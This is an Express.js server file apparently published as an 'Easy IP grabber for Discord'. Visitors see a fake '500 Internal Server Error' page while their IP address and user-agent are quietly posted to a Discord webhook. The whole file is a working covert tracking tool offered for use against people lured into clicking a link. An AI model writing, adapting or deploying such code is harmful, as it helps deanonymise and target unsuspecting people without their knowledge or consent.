const express = require('express');
const morgan = require('morgan');
const axios = require('axios');
const { hidePoweredBy } = require('helmet');

const app = express();

app.use(hidePoweredBy());
app.use(morgan('combined'));

app.get('/', (req, res) => {
	res.send('500 Internal Server Error');

	const embeds = [{
		color: 16711740,
		author : {
			name: 'Easy IP grabber for Discord',
			icon_url: '',
		},
		description: `\`\`\`${req.headers['user-agent']}\`\`\``,
		fields: [
			{
				name: '» User IP',
				value: `> ${req.ip}`,
			},
		],
		footer: {
			text: '🌍 https://github.com/sefinek24/easy-ip-grabber-for-discord',
		},
	}];

	const data = JSON.stringify({ embeds });
	const config = {
		method: 'POST',
		url: process.env.WEBHOOK_URL,
		headers: { 'Content-Type': 'application/json' },
		data,
	};

	try {
		axios(config);
	} catch (err) {
		console.log(err);
	}
});

app.listen(process.env.PORT, () => {
	console.log(`App is running at http://127.0.0.1:${process.env.PORT}`);
});